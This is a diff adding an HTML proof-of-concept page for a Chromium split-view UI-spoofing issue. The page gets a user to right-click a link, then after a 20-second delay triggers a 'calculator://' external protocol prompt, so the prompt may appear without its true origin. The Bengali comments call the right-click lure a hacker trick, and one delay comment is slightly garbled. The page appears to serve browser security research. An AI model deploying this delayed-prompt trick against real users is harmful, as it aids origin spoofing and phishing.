@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome Split View UI Spoofing PoC</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        h1 { color: #d9534f; }
+        p { color: #333; font-size: 16px; line-height: 1.5; }
+        .target-link {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 12px 25px;
+            background-color: #0078d4;
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .instructions {
+            background-color: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 15px;
+            margin-top: 25px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Security Research PoC</h1>
+    <p>Chromium Split View External Protocol Handler Obstruction</p>
+    
+    <!-- হ্যাকারদের ব্যবহৃত সাধারণ ট্রিক ইউজারকে রাইট-ক্লিক করতে বাধ্য করার জন্য -->
+    <a href="#" id="pocLink" class="target-link">Right-Click Me & Select "Open in Split View"</a>
+
+    <div class="instructions">
+        <strong>How to test (On vulnerable older Chromium versions):</strong>
+        <ol>
+            <li>Ensure <code>#side-by-side</code> or <code>#split-view</code> flag is enabled in <code>chrome://flags</code>.</li>
+            <li>Right-click the blue button above.</li>
+            <li>Select <strong>"Open link in split view"</strong> (or side-by-side window).</li>
+            <li>Observe if the external protocol prompt opens without properly showing this page's origin, or if it overlays confusingly over another active tab.</li>
+        </ol>
+    </div>
+</div>
+
+<script>
+    const pocLink = document.getElementById('pocLink');
+
+    // ইউজার রাইট-ক্লিক করার পর ইভেন্ট ট্রিগার হবে
+    pocLink.addEventListener('contextmenu', function() {
+        const maliciousProtocol = "calculator://"; 
+        
+        console.log("Right-click detected. Waiting for 20 seconds...");
+
+        // ২০ সেকেন্ড (২০০০Sync মিলিসেকেন্ড) ডিলে সেট করা হলো
+        setTimeout(() => {
+            console.log("20 seconds over! Triggering the external protocol handler prompt...");
+            window.location.href = maliciousProtocol;
+        }, 20000); 
+    });
+</script>
+
+</body>
+</html>
